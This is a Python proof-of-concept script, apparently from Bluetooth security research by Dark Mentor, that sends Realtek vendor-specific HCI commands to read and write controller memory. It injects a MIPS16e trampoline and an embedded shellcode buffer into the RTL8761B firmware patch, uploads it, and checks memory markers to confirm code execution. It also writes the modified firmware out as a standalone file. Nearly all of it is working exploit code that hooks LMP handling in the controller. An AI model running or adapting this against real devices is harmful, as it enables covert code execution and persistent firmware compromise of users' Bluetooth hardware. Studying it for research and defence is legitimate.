# By Xeno Kovah, Copyright 2025 Dark Mentor LLC - https://darkmentor.com

import usbbluetooth
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete
from scapy.layers.bluetooth import HCI_Cmd_Reset, HCI_Cmd_Read_Local_Version_Information

class HCI_Cmd_VSC_Realtek_Read_Mem(Packet):
    name = "Realtek Read Memory"
    fields_desc = [
        ByteField("size", 0x20),
        XLEIntField("address", 0x80000000)
    ]

class HCI_Cmd_VSC_Realtek_Write_Mem(Packet):
    name = "Realtek Write Memory"
    fields_desc = [
        ByteField("size", 0x20),
        XLEIntField("address", 0x80000000),
        XLEIntField("data_to_write", 0x33221100)
    ]

class HCI_Cmd_VSC_Realtek_Download_Patch(Packet):
    name = "Realtek Download Patch"
    fields_desc = [
        ByteField("index", 0x00),
        XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)
    ]

class HCI_Cmd_Complete_VSC_Realtek_Read_Mem(Packet):
    name = 'Realtek Read Memory complete'
    fields_desc = [
        XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)
    ]

class HCI_Cmd_Complete_VSC_Realtek_Write_Mem(Packet):
    name = 'Realtek Write Memory complete'
    fields_desc = [
        XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)
    ]

class HCI_Cmd_Complete_VSC_Realtek_Download_Patch(Packet):
    name = 'Realtek Write Memory complete'
    fields_desc = [
        ByteField("index", 0x00),
    ]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Download_Patch, ogf=0x3f, ocf=0x0020)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Read_Mem, ogf=0x3f, ocf=0x0061)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Write_Mem, ogf=0x3f, ocf=0x0062)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC_Realtek_Download_Patch, opcode=0xfc20)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC_Realtek_Read_Mem, opcode=0xfc61)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC_Realtek_Write_Mem, opcode=0xfc62)


# UPDATE: Want the logging-only on ZEXMTE, which is (0x0bda, 0xa728)
def find_realtek_device():
    controllers = usbbluetooth.list_controllers()
    for c in controllers:
        # Connect to any Realtek device that I've seen so far
        # if (c.vendor_id == 0x0bda and c.product_id == 0xa729): # for when you only want to test with a specific device
        # if (c.vendor_id == 0x2550 and c.product_id == 0x8761):	# for when you only want to test with a specific device
        if( (c.vendor_id == 0x0bda and c.product_id == 0xa728) or \
            (c.vendor_id == 0x0bda and c.product_id == 0xa729) or \
            (c.vendor_id == 0x2550 and c.product_id == 0x8761) or \
            (c.vendor_id == 0x2357 and c.product_id == 0x0604)):
            return c
    return None


def reset(socket):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_Reset()
    response = socket.sr1(pkt, verbose=0)
    if not HCI_Event_Command_Complete in response or response[HCI_Event_Command_Complete].status != 0:
        return False
    return True


def read(socket, address=0x80000000):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Read_Mem(address=address)
    #pkt.show()
    response = socket.sr1(pkt, verbose=0)
    #response.show()
    if not HCI_Event_Command_Complete in response or response[HCI_Event_Command_Complete].status != 0:
        return None
    return response.data


# Assuming 4 byte writes for now, even though it can do 1 and 2 byte writes too
def write(socket, address=0x80000000, data=0x33221100):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Write_Mem(address=address, data_to_write=data)
    #pkt.show()
    response = socket.sr1(pkt, verbose=0)
    #response.show()
    if not HCI_Event_Command_Complete in response or response[HCI_Event_Command_Complete].status != 0:
        return None
    # return response.data


g_patch_data = None
g_patch_start = None
g_patch_end = None
g_patch_version = None
# selection_index is probably supposed to be set from the value that comes back from 0xFC6D but idk for sure
def read_patch_file(selection_index=1):
    global g_patch_data
    global g_patch_start
    global g_patch_end
    global g_patch_version
    try:
        with open("./rtl8761bu_fw.bin", "rb") as f:
            # Use a mutable bytearray so later in-place slice assignments are allowed
            g_patch_data = bytearray(f.read())
    except FileNotFoundError:
        print("Patch file not found. Please ensure 'rtl8761b_fw.bin' is in the current directory.")
        exit(1)

    g_patch_version = g_patch_data[8:12]
    print(f"Patch version: 0x{int.from_bytes(g_patch_version, 'little'):08x}")

    chip_array_len = int.from_bytes(g_patch_data[12:14], 'little')
    print("Number of chip revisions in patch:", chip_array_len)
    chip_ids_begin_index = 14

    chip_ids = []
    for i in range(0, chip_array_len):
        chip_id = int.from_bytes(g_patch_data[chip_ids_begin_index+i*2:chip_ids_begin_index+i*2+2], 'little')
        chip_ids.append(chip_id)

    patch_lenths_begin_index = chip_ids_begin_index + chip_array_len * 2
    patch_lenths = []
    for i in range(0, chip_array_len):
        patch_len = int.from_bytes(g_patch_data[patch_lenths_begin_index+i*2:patch_lenths_begin_index+i*2+2], 'little')
        patch_lenths.append(patch_len)

    patch_start_offsets_index = patch_lenths_begin_index + chip_array_len * 2
    patch_start_offsets = []
    for i in range(0, chip_array_len):
        patch_start_offset = int.from_bytes(g_patch_data[patch_start_offsets_index+i*4:patch_start_offsets_index+i*4+4], 'little')
        patch_start_offsets.append(patch_start_offset)

    g_patch_start = patch_start_offsets[selection_index]
    g_patch_end = g_patch_start + patch_lenths[selection_index]
    print(f"Selected patch start: 0x{g_patch_start:08x}, end: 0x{g_patch_end:08x}")


# This function will save our updated patch data (with our PoC code inserted) back to g_patch_data and update the patch length for the selected chip
def write_patch_file(selection_index=1, updated_patch_chunk=None):
    global g_patch_data
    global g_patch_start
    global g_patch_end
    global g_patch_version

    if updated_patch_chunk is None:
        print("No updated patch chunk provided to write_patch_file()!")
        return

    # Re-collect the non-global data (not saved in read_patch_file()) that we need to paste in the updated_patch_chunk and it's length to the correct locations
    chip_array_len = int.from_bytes(g_patch_data[12:14], 'little')
    print("Number of chip revisions in patch:", chip_array_len)
    chip_ids_begin_index = 14

    chip_ids = []
    for i in range(0, chip_array_len):
        chip_id = int.from_bytes(g_patch_data[chip_ids_begin_index+i*2:chip_ids_begin_index+i*2+2], 'little')
        chip_ids.append(chip_id)

    patch_lenths_begin_index = chip_ids_begin_index + chip_array_len * 2
    patch_lenths = []
    for i in range(0, chip_array_len):
        patch_len = int.from_bytes(g_patch_data[patch_lenths_begin_index+i*2:patch_lenths_begin_index+i*2+2], 'little')
        # Update the length of the patch to include the PoC code, but keep the old length in the patch_lenths array for later use
        if(i == selection_index):
            new_patch_len = len(updated_patch_chunk)
            g_patch_data[patch_lenths_begin_index+i*2:patch_lenths_begin_index+i*2+2] = new_patch_len.to_bytes(2, 'little')
        patch_lenths.append(patch_len)

    # DELETEME: we don't need this sinec we already have g_patch_start from before as a global
    patch_start_offsets_index = patch_lenths_begin_index + chip_array_len * 2
    patch_start_offsets = []
    for i in range(0, chip_array_len):
        patch_start_offset = int.from_bytes(g_patch_data[patch_start_offsets_index+i*4:patch_start_offsets_index+i*4+4], 'little')
        patch_start_offsets.append(patch_start_offset)

    g_patch_start = patch_start_offsets[selection_index]
    g_patch_end = g_patch_start + patch_lenths[selection_index]
    print(f"Selected patch start: 0x{g_patch_start:08x}, end: 0x{g_patch_end:08x}")
    output_file_data = g_patch_data[0:g_patch_start] + updated_patch_chunk + g_patch_data[g_patch_end:]

    try:
        with open("./final_patched_poc_fw.bin", "wb") as f:
            f.write(output_file_data)
        print(f"Wrote {len(output_file_data)} bytes to ./final_patched_poc_fw.bin")
    except Exception as e:
        print(f"Failed to write final_patched_poc_fw.bin: {e}")


g_config_data = None
def read_config_file(filename="./rtl8761bu_config.bin"):
    global g_config_data
    try:
        with open(filename, "rb") as f:
            g_config_data = f.read()
    except FileNotFoundError:
        print("Config file not found. Please ensure '{filename}' is in the current directory.")
        exit(2)


def download_patches(socket):
    patch_data_from_file = bytearray(g_patch_data[g_patch_start:g_patch_end])
    # Overlay the patch version on the last 4 bytes of data (this just seems to be done by existing tools)
    patch_data_from_file[-4:] = g_patch_version

    # Overwrite the beginning of the patch data with the trampoline to g_poc_buf tacked on to the end
    data_before_poc_len = len(patch_data_from_file) + len(g_config_data)
    if(data_before_poc_len % 4) != 0:
        alignment_padding_bytes = bytearray([0x41 * (4 - (data_before_poc_len % 4))])
    final_full_data = bytearray(patch_data_from_file + g_config_data + alignment_padding_bytes + g_poc_buf)
    final_offset_len = data_before_poc_len + len(alignment_padding_bytes)

    # Theoretically might need to use +1 on the address (0x8010a001) to set ISA bit = 1
    # to get MIPS16e interpretation of target address (though it's already always in that mode
    # in my current tests, so I'm just setting this for possible future-proofing.)
    # Original first-patch (0x3780 -> 0x8010a000) epilog patch offset was 0x238:0x238+0x0C
    # New LMP-hooking (0x3780 + 0x427C = 79FC -> 0x8010e27c) epilog has a buffer offset of (0x8010e27c - 0x8010a000) 0x427C + (0x8010e306 - 0x8010e27c) 0x8a = 0x4306:0x4306+0xC
    # NOTE!!: Even though the nominal offset is 0x4306, I found it only worked with 0x4308! This probably has to do with the PC-relative LW not liking a non-4-byte-aligned address to read from...
    # NOTE!: This address is actually different in the UART vs. USB patch file! For UART it starts at (0x7d50 -> 0x8010e5d0)
    # and thus the epilog has a buffer offset of (0x8010e5d0 - 0x8010a000) 0x45d0 + (0x8010e65a - 0x8010e5d0) 0x8a = 0x465A:0x465A+0xC
    patch_buf_offset = 0x4306+2 # +2 to align mem address to read from on a 4-byte boundary
    patch_buf_insert_size = 0x08
    poc_mem_address = list((0x8010a001 + final_offset_len).to_bytes(4, 'little'))
    print("POC Start Address = 0x" + ''.join("%02x" % b for b in reversed(poc_mem_address)))
    print(f"First {patch_buf_insert_size} bytes of final_full_data before patch: " + ''.join("%02x" % b for b in final_full_data[patch_buf_offset:patch_buf_offset+patch_buf_insert_size]))
    final_full_data[patch_buf_offset:patch_buf_offset+patch_buf_insert_size] = bytearray([
        # Code bytes come from inline_epilog_hook_byte_helper in poc2.asm
        0x01, 0xb3,  # lw    v1, 0x4(pc)   ; Loads the uint32 at pc+4 into v1
        0x80, 0xeb,  # jrc   v1            ; Jump to the target (with no delay slot)
    ] + poc_mem_address) # hardcoded address of target at end of date
    print(f"First {patch_buf_insert_size} bytes of final_full_data after patch: " + ''.join("%02x" % b for b in final_full_data[patch_buf_offset:patch_buf_offset+patch_buf_insert_size]))
    final_full_data = bytes(final_full_data)
    # Save a copy of the final data that we upload, so it can be used as a standalone patch file by just placing it in the correct location on Linux and letting that load it
    write_patch_file(selection_index=1, updated_patch_chunk=final_full_data)


    offset = 0
    frag_index = 0
    done = False
    while not done:
        length = min(len(final_full_data) - offset, 252)
        frag_data = final_full_data[offset:offset+length]

        # Check if this is the last fragment
        if((offset + length) == len(final_full_data)):
            frag_index |= 0x80
            done = True

        # Send the VSC
        pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Download_Patch(index=frag_index, data=frag_data)
        #pkt.show()
        response = socket.sr1(pkt, verbose=0)
        #response.show()
        if HCI_Event_Command_Complete not in response or response[HCI_Event_Command_Complete].status != 0 or HCI_Cmd_Complete_VSC_Realtek_Download_Patch not in response:
            return None
        else:
            print(f"Success for patch fragment {frag_index & 0x7F} at offset 0x{offset:04x} with length 0x{length:02x}")

        frag_index += 1
        offset += length

    return True


def read_local_version_info(socket):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_Read_Local_Version_Information()
    #pkt.show()
    response = socket.sr1(pkt, verbose=0)
    #response.show()
    if not HCI_Event_Command_Complete in response or response[HCI_Event_Command_Complete].status != 0:
        return None
    else:
        print(f"HCI Version: 0x{response.hci_version:02x}")
        print(f"HCI Revision: 0x{response.hci_subversion:02x}")
        print(f"LMP Version: 0x{response.lmp_version:02x}")
        print(f"Manufacturer: 0x{response.company_identifier:02x}")
        print(f"LMP Subversion: 0x{response.lmp_subversion:02x}")


def write_and_confirm_with_read(socket, address, data):
    write(socket, address, data)
    read_data = read(socket, address)
    if(int.from_bytes(read_data, 'little') != data):
        print(f"[!] Write to {address} failed, exiting!")
        return False
    else:
        return True


# # The poc v1 re-created as byte array
# g_poc_buf = bytearray([0x01,0xb3,0x02,0x10,0x50,0x03,0x12,0x80,0x41,0x6a,0x40,0xc3,0xfb,0x63,0x09,0x62,0x08,0xd1,0x07,0xd0,0x04,0xb2,0x00,0x65,0x02,0xb3,0x00,0x65,0x00,0xeb,0x00,0x65,0x0d,0xa0,0x10,0x80,0x22,0xd9,0xc6,0xdf])

# See poc2.asm for instructions how how to extract the byte strings
g_poc_buf = bytearray([0x5b,0xb3,0x80,0x9b,0x5c,0xb2,0x80,0xda,0x20,0xf0,0x01,0x0a,0x40,0xdb,0x00,0x65,0x58,0xb3,0x80,0x9b,0x59,0xb2,0x80,0xda,0x80,0xf0,0x19,0x0a,0x40,0xdb,0x09,0x97,0x08,0x91,0x07,0x90,0x00,0xef,0x05,0x63,0xfc,0x63,0x00,0xd4,0x01,0xd5,0x02,0xd6,0x03,0x62,0x00,0x65,0x60,0xac,0x3f,0xf6,0x02,0x73,0x00,0x65,0x2f,0x61,0xfc,0x63,0x01,0xd4,0x02,0xd5,0x03,0xd6,0x04,0xd7,0x05,0xd2,0x06,0xd3,0xc2,0xa4,0xa4,0x67,0x03,0x4d,0x00,0x65,0x4e,0x0c,0x00,0x65,0x49,0xb2,0x40,0xea,0x00,0x65,0x01,0x94,0xc2,0xa4,0xff,0x6c,0x4a,0x0d,0x00,0x65,0x4e,0xb2,0x40,0xea,0x00,0x65,0x00,0x6c,0x47,0x0d,0x0a,0x6e,0x03,0x6f,0x00,0x65,0xfd,0x63,0x64,0x6a,0x04,0xd2,0x00,0x6a,0x05,0xd2,0x00,0x65,0x41,0xb2,0x40,0xea,0x00,0x65,0x00,0x65,0x03,0x63,0x01,0x94,0x02,0x95,0x03,0x96,0x04,0x97,0x05,0x92,0x06,0x93,0x04,0x63,0x03,0x95,0xfd,0x65,0x02,0x96,0x01,0x95,0x00,0x94,0x04,0x63,0x33,0xb3,0x60,0x9b,0x80,0xeb,0x00,0x65,0xfc,0x63,0x00,0xd4,0x01,0xd5,0x02,0xd6,0x03,0xd0,0x04,0xd1,0x05,0x62,0xfe,0x63,0x00,0xd4,0x01,0xd5,0x02,0xd6,0x03,0xd2,0x38,0x6e,0xcc,0x6d,0x36,0x0c,0x00,0x65,0x2c,0xb2,0x40,0xea,0x00,0x65,0x03,0x92,0x02,0x96,0x01,0x95,0x00,0x94,0x02,0x63,0x31,0x0a,0x00,0x65,0x3e,0xb3,0x60,0xda,0x81,0xda,0x60,0x9c,0x62,0xda,0x61,0x9c,0x63,0xda,0x64,0x8c,0x68,0xca,0x00,0x65,0x3a,0xb3,0x65,0xda,0x04,0x67,0x00,0x65,0x68,0x8a,0x80,0xf4,0x00,0x73,0x00,0x65,0x13,0x61,0x00,0x65,0x82,0x9a,0x60,0x9c,0x66,0xda,0x61,0x9c,0x67,0xda,0x62,0x9c,0x68,0xda,0x63,0x9c,0x69,0xda,0x64,0x9c,0x6a,0xda,0x65,0x9c,0x6b,0xda,0x66,0x9c,0x6c,0xda,0x00,0x65,0x2e,0xb3,0x6d,0xda,0xfe,0x63,0x00,0xd4,0x01,0xd5,0x02,0xd6,0x03,0xd2,0xff,0x6c,0x1a,0x0d,0x38,0x6e,0x18,0xb2,0x40,0xea,0x00,0x65,0x03,0x92,0x02,0x96,0x01,0x95,0x00,0x94,0x02,0x63,0x90,0x67,0x05,0x91,0xf9,0x65,0x00,0x94,0x01,0x95,0x02,0x96,0x03,0x90,0x04,0x91,0x04,0x63,0x00,0x65,0x05,0xb3,0x60,0x9b,0x80,0xeb,0x00,0x65,0x10,0x0f,0x12,0x80,0xd4,0xae,0x12,0x80,0xfc,0x3f,0x13,0x80,0xf8,0x3f,0x13,0x80,0x5d,0xe8,0x00,0x80,0x8d,0xe9,0x00,0x80,0x80,0x04,0x00,0x00,0xe5,0x11,0x06,0x80,0x27,0x00,0xde,0xad,0xbe,0xef,0xca,0xfe,0x13,0x37,0xde,0xad,0xbe,0xef,0xca,0xfe,0x13,0x37,0x00,0x65,0x71,0xd0,0x01,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x41,0x41,0x41,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,
0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58])


def main():
    print("[+] Locating a Realtek device...")
    controller = find_realtek_device()
    if controller is None:
        print("[!] Could not find a suitable device!")
        return

    print("[+] Opening socket...")
    socket = UsbBluetoothSocket(controller)

    print("[+] Resetting the controller...")
    if not reset(socket):
        print("[!] Could not reset the device!")

    # Sanity checks...

    dst_write_addr = 0x80120494
    data = read(socket, dst_write_addr)
    data_int = int.from_bytes(data, 'little') if data is not None else None
    print(f"Address that should be our hook1 fptr: 0x{data_int:08x}")

    #########################################################################
    # Begin RTK patch download
    #########################################################################

    read_local_version_info(socket)
    read_patch_file()
    ### NOTE: You will need to update this if you're using a device with a different USB VID:PID
    if((controller.vendor_id == 0x0bda and controller.product_id == 0xa728)):
        read_config_file(filename="./rtl8761b_config_set_bdaddr_only_1337.bin") # ZEXMTE gets BDADDR 13:37:13:37:13:37
    else:
        read_config_file(filename="./rtl8761b_config_set_bdaddr_only_1338.bin") # Other devices (e.g. EDUP) get BDADDR 13:38:13:38:13:38
    download_patches(socket)
    read_local_version_info(socket)

    #########################################################################
    # Check if my code ran
    #########################################################################

    # Confirm if the code executed and wrote to 0x80133FFC
    dst_write_addr = 0x80133FFC
    expected_value = 0x8010d891
    data = read(socket, dst_write_addr)
    data_int = int.from_bytes(data, 'little') if data is not None else None
    if(data is None):
        print("[-] We shouldn't have got here. We should have been blocked in patch download if it failed...")
        exit(1)
    if(data_int != expected_value):
        print(f"[-] Code execution unconfirmed! (Value = {data_int:08x} at {dst_write_addr:08x})")
    else:
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print(f"[+] Code execution confirmed! Expected value {expected_value:08x} found at 0x{dst_write_addr:08x}!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")

    dst_write_addr = 0x80133FF8
    expected_value = 0x8010DFB1
    data = read(socket, dst_write_addr)
    data_int = int.from_bytes(data, 'little') if data is not None else None
    if(data is None):
        print("[-] We shouldn't have got here. We should have been blocked in patch download if it failed...")
        exit(1)
    if(data_int != expected_value):
        print(f"[-] Code execution unconfirmed! (Value = {data_int:08x} at {dst_write_addr:08x})")
    else:
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print(f"[+] Code execution confirmed! Expected value {expected_value:08x} found at 0x{dst_write_addr:08x}!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")

    dst_write_addr = 0x80120f10
    data = read(socket, dst_write_addr)
    data_int = int.from_bytes(data, 'little') if data is not None else None
    print(f"[?] Address that should be our hook1 fptr: 0x{data_int:08x}")

    dst_write_addr = 0x8012aed4
    data = read(socket, dst_write_addr)
    data_int = int.from_bytes(data, 'little') if data is not None else None
    print(f"[?] Address that should be our hook2 fptr: 0x{data_int:08x}")

if __name__ == "__main__":
    main()